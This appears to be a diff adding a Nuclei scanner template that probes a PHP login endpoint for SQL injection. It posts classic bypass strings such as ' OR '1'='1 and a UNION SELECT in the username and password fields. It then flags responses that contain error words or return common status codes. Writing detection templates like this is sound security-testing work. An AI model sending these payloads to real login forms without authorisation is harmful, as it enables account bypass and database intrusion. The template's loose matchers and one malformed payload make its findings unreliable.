@@ -1,0 +1,43 @@
+id: sql-injection
+info:
+  name: "SQL Injection Detection via POST request"
+  author: "Jakob Vango"
+  severity: "high"
+  description: "Detects potential SQL injection vulnerabilities via POST request on login served on a PHP page"
+  tags: sqli injection
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?action=auth"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Nuclei SQLi Scan"
+    body: "login_username={{sql_injection_payload}}&login_password={{sql_injection_payload}}&login_code=&saveusername=yes&ref_url="
+    payloads:
+      sql_injection_payload:
+        - "' OR '1'='1"
+        - "' OR 'a'='a"
+        - "' UNION SELECT NULL--"
+        - "' 1+1=1'--"
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+          - "Warning"
+          - "error"
+          - "SQL"
+        part: body
+      - type: status
+        status:
+          - 200
+          - 500
+          - 400
+    extractors:
+      - type: regex
+        regex:
+          - "(SQL syntax error.*)"
+          - "(Warning.*)"
+          - "(syntax error.*)"
+        part: body
